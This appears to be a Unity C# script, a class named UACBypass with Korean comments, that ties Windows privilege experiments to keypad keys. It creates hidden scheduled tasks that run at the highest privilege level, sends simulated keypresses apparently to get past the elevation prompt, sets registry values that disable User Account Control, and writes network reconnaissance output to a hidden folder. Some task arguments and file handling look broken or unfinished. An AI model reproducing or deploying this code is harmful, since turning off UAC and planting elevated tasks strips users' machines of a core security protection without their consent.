using System.Collections;
using System.Diagnostics;
using System.Reflection;
using System.IO;
using System.IO.Pipes;
using System.Threading;
using System.Threading.Tasks;

using UnityEngine;
using System;
using Unity.VisualScripting;
using System.Text;
using UnityEditor;
using static UnityEditor.Rendering.CameraUI;


public class UACBypass : MonoBehaviour
{
    private static readonly object Lock = new object();
    private const string TASKNAME = "TASK_AAA";
    //Task Scheduler
    public void Add()
    {
        lock (Lock)
        {
            //Process currentProcess = Process.GetCurrentProcess();
            //string windowTitle = currentProcess.MainWindowTitle;     실행중인 창 제목

            string currentProgramPath = Assembly.GetExecutingAssembly().Location;

            // 작업 등록 명령어
            string arguments = $"/Create /F /SC ONCE /TN {TASKNAME} /TR \"{currentProgramPath}\" /RL HIGHEST /ST 00:00";

            // 관리자 권한으로 schtasks 명령어 실행
            Process.Start(new ProcessStartInfo
            {
                FileName = "schtasks",
                Arguments = arguments,
                LoadUserProfile = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                Verb = "runas" // 관리자 권한
            });

            KeyBoard.KeyInput(Keys.VK_LEFT);
            KeyBoard.KeyInput(Keys.VK_RETURN);
        }
    }

    public void Delete()
    {
        lock (Lock)
        {
            // 작업 삭제 명령어
            string arguments = $"/Delete /F /TN {TASKNAME}";

            // 관리자 권한으로 schtasks 명령어 실행
            Process.Start(new ProcessStartInfo
            {
                FileName = "schtasks",
                Arguments = arguments,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                Verb = "runas" // 관리자 권한으로 실행
            });
        }
    }


    //UAC는 키보드 인풋 차단함
    //LOCAL_MACHINE부분은 Window의 Core를 손상할 수 있기에 관리자 권한이 없으면 Registry.SetValue가 차단됨

    //PowerShell을 작업 스케줄러에 추가 -> 강제로 관리자 권한 실행 -> 권한 등급 낮춤 -> 다른 프로그램 강제로 관리자 권한
    //관리자 CMD -> 관리자 Powershell -> 관리자권한 값 0으로(여기까지 성공) -> 
    public async void Crack()
    {
        var lowerAuthLevel = Task.Run(async () =>
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                // /C는 실행 후 종료, /K는 실행 후 유지
                Arguments = $"/C powershell start-process powershell -verb runas -ArgumentList '-Command \"Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\\" -Name \"ConsentPromptBehaviorAdmin\" -Value 0 -Force; Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"EnableLUA\" -Value 0 -Force \"'",
                UseShellExecute = true,
                //RedirectStandardOutput = true,    //UseShellExecute를 true로 해야 관리자 권한으로 실행됨
                //RedirectStandardError = true,     //이하 동일
                RedirectStandardInput = false,
                CreateNoWindow = false,
                WindowStyle = ProcessWindowStyle.Normal,
                Verb = "runas"
            };
            using (Process process = Process.Start(psi))
            {
                await Task.Run(() => { process.WaitForExit(); });
            }
        });
        await lowerAuthLevel;


        //SystemRool가 정확함
        string currentProgramPath = @"%SystemRoot%\system32\cmd.exe";
        
        // 작업 등록 명령어
        //"/C schtasks /Create /TN \"Task1\" /TR \"C:\\Path\\To\\File1.exe\" /SC ONCE /ST 12:00 && schtasks /Create /TN \"Task2\" /TR \"C:\\Path\\To\\File2.exe\" /SC ONCE /ST 12:30";
        string arguments = $"/Create /F /SC ONCE /TN {"cmd"} /TR \"{currentProgramPath}\" /RL HIGHEST /ST 00:00";
        string arguments2 = $"/Create /TN \"Task2\" /TR \"C:\\Path\\To\\\\File2.exe\\\" /SC ONCE /ST 12:30\"";
        var task = Task.Run(async () =>
        {
            Process priorityCMD = Process.Start(new ProcessStartInfo
            {
                FileName = "schtasks",           // 관리자 권한으로 schtasks 명령어 실행
                Arguments = arguments,          //CMD 권한
                LoadUserProfile = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                Verb = "runas" // 관리자 권한
            });
            Process priorityPS = Process.Start(new ProcessStartInfo
            {
                FileName = "schtasks",           // 관리자 권한으로 schtasks 명령어 실행
                Arguments = arguments2,             //PS권한
                LoadUserProfile = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                Verb = "runas" // 관리자 권한
            });

            await Task.WhenAll(Task.Run(() => { priorityCMD.WaitForExit(); }), Task.Run(() => { priorityPS.WaitForExit(); }));
        });
        await task;

         //var result = Task<string>.Run(() => Authority("%SystemRoot%", EVERYONE, ));

        /*

        // 작업 삭제 명령어
        arguments = $"/Delete /F /TN {TASKNAME}";

        // 관리자 권한으로 schtasks 명령어 실행      작업 스케줄 삭제
        Process.Start(new ProcessStartInfo
        {
            FileName = "schtasks",
            Arguments = arguments,
            WindowStyle = ProcessWindowStyle.Hidden,
            UseShellExecute = true,
            Verb = "runas" // 관리자 권한으로 실행
        });
        */
    }





    public async void Test()
    {
        lock(Lock)
        {
            string[] cmd = new string[] { "cd c:\\", "dir", "ipconfig", "pause" };
            string fullCommand = string.Join(" & ", cmd);

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                //Arguments = $"/K {fullCommand}",        // /C는 실행 후 종료, /K는 실행 후 유지
                UseShellExecute = true,
                //RedirectStandardOutput = true,    //UseShellExecute를 true로 해야 관리자 권한으로 실행됨
                //RedirectStandardError = true,     //이하 동일
                RedirectStandardInput = false,
                CreateNoWindow = false,
                WindowStyle = ProcessWindowStyle.Normal,
                Verb = "runas"
            };

            using (Process process = Process.Start(psi))
            {
                if (process != null)
                {
                    process.WaitForExit();
                }
            }

            ProcessStartInfo getNetwork = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/K chcp 437",        // /C는 실행 후 종료, /K는 실행 후 유지
                UseShellExecute = false,
                RedirectStandardOutput = true,    //UseShellExecute를 true로 해야 관리자 권한으로 실행됨
                //RedirectStandardError = true,     //이하 동일
                RedirectStandardInput = true,
                CreateNoWindow = false,               
                WindowStyle = ProcessWindowStyle.Normal,
                Verb = "runas"
            };
            getNetwork.StandardOutputEncoding = Encoding.UTF8;
            string output = "";
            using (Process process = Process.Start(getNetwork))
            {
                if (process != null)
                {
                    using(StreamWriter sw = process.StandardInput)
                    {
                        sw.WriteLine("ipconfig -all");
                        sw.WriteLine("netstat -a");           
                    }
                    output = process.StandardOutput.ReadToEnd();

                }
            }

            string filePath = "C:\\hide\\cmd";
            var path = filePath.Split("\\");
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.Append(path[0]);
            stringBuilder.Append("\\");
            for(int i = 1; i < path.Length - 1; i++)
            {
                stringBuilder.Append(path[i]);
                stringBuilder.Append("\\");
                if (!Directory.Exists(stringBuilder.ToString()))
                {
                    Directory.CreateDirectory(stringBuilder.ToString());
                }
            }

            File.WriteAllText(filePath, output);
            using (Process notepad = Process.Start("notepad.exe", filePath))
            {
                notepad.WaitForExit();

                Directory.Delete(filePath);
            }
        }
    }

    public void TaskKillTest()
    {

    }


    private void Update()
    {
        if(Input.GetKeyDown(KeyCode.Keypad1))
        {
            Add();
        }
        if (Input.GetKeyDown(KeyCode.Keypad2))
        {
            Delete();
        }
        if (Input.GetKeyDown(KeyCode.Keypad3))
        {
            Crack();
        }
        if (Input.GetKeyDown(KeyCode.Keypad4))
        {
            Test();
        }

        if (Input.GetKeyDown(KeyCode.Keypad5))
        {
            Registrys.Test2();
        }
        if(Input.GetKeyDown(KeyCode.Return))
        {
            UnityEngine.Debug.Log(Input.GetKeyDown(KeyCode.Return));

        }
    }
}
